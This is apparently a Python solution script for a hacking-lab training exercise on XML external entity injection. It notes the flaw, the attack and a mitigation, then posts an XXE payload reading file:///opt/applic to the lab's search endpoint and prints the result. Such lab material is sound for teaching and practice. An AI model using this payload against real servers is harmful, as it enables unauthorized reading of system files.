__problem__ = \
"""
Server uses XML to query. But the query was made in client and is not verified.
"""

__attack__ = \
"""
Use query to read file's system.
"""

__mitigation__ = \
"""
Build query on server. Configure server's permissions.
"""

import logging

import requests

from __base__ import setup_log

log = logging.getLogger(__name__)


def inject_xml_query():
    r = requests.get("http://glocken.hacking-lab.com/12001/ws_case2/ws2/")
    print(r.headers)
    r = requests.post("http://glocken.hacking-lab.com/12001/ws_case2/ws2/xmlsearch",
                      headers={
                          "Cookie": r.headers["Set-Cookie"],
                          "Content-Type": "application/xml"
                      },
                      data="""
                 <?xml version="1.0" encoding="UTF-8"?>
                  <!DOCTYPE foo [
                  <!ELEMENT foo ANY >
                  <!ENTITY xxe SYSTEM "file:///opt/applic">]>
                  <query>
                    <result-limit>1</result-limit>
                    <bell-name>foo</bell-name>
                    <bell-description>&xxe;</bell-description>
                  </query>
                 """)
    print(r.text)


if __name__ == '__main__':
    setup_log()
    inject_xml_query()
